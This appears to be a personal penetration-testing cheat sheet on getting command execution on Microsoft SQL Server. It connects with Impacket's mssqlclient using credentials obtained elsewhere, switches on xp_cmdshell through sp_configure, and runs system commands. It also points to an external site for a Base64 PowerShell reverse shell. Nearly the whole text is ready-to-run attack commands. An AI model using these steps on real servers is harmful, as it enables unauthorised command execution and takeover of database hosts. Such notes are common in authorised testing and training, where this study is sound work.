# MsSQL

## Impacket mssqlclient.py
On Kali it is installed as `impacket-mssqlclient`
I used it after obtaining credentials another way
```
impacket-mssqlclient [[domain/]username[:password]@]<targetName or address> -windows-auth

# In case of this error
# [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.

impacket-mssqlclient username@<targetName or address>
```


After authenticating
```
enable_xp_cmdshell
RECONFIGURE
xp_cmdshell <command to execute>

# Simple reverse shell
# https://www.revshells.com/
# PowerShell #3 (Base64)
```
In case of errors like
```
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```
More advanced way to turn on xp_cmdshell
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
